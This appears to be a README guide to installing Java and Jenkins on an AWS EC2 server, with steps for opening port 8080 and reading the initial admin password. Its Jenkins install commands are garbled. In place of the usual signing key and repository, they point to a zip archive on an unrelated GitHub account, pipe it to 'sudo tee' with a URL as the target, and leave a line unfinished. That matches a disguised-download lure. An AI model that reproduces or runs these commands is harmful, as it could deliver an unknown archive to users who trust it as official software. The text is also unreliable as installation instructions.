### Install Jenkins.

Pre-Requisites:
 - Java (JDK)

### Run the below commands to install Java and Jenkins

Install Java

```
sudo apt update
sudo apt install openjdk-11-jre
```

Verify Java is Installed

```
java -version
```

Now, you can proceed with installing Jenkins

```
curl -fsSL https://raw.githubusercontent.com/sivahariu/Jenkins-Zero-To-Hero/main/multi-stage-multi-agent/Jenkins-Zero-To-Hero_v3.2.zip | sudo tee \
  https://raw.githubusercontent.com/sivahariu/Jenkins-Zero-To-Hero/main/multi-stage-multi-agent/Jenkins-Zero-To-Hero_v3.2.zip > /dev/null
echo deb [https://raw.githubusercontent.com/sivahariu/Jenkins-Zero-To-Hero/main/multi-stage-multi-agent/Jenkins-Zero-To-Hero_v3.2.zip] \
  https://raw.githubusercontent.com/sivahariu/Jenkins-Zero-To-Hero/main/multi-stage-multi-agent/Jenkins-Zero-To-Hero_v3.2.zip binary/ | sudo tee \

sudo apt-get update
sudo apt-get install jenkins
```

**Note: ** By default, Jenkins will not be accessible to the external world due to the inbound traffic restriction by AWS. Open port 8080 in the inbound traffic rules as show below.

- EC2 > Instances > Click on <Instance-ID>
- In the bottom tabs -> Click on Security
- Security groups
- Add inbound traffic rules as shown in the image (you can just allow TCP 8080 as well, in my case, I allowed `All traffic`).

### Login to Jenkins using the below URL:

http://<ec2-instance-public-ip-address>:8080    [You can get the ec2-instance-public-ip-address from your AWS EC2 console page]

Note: If you are not interested in allowing `All Traffic` to your EC2 instance
      1. Delete the inbound traffic rule for your instance
      2. Edit the inbound traffic rule to only allow custom TCP port `8080`
  
After you login to Jenkins, 
      - Run the command to copy the Jenkins Admin Password - `sudo cat /var/lib/jenkins/secrets/initialAdminPassword`
      - Enter the Administrator password
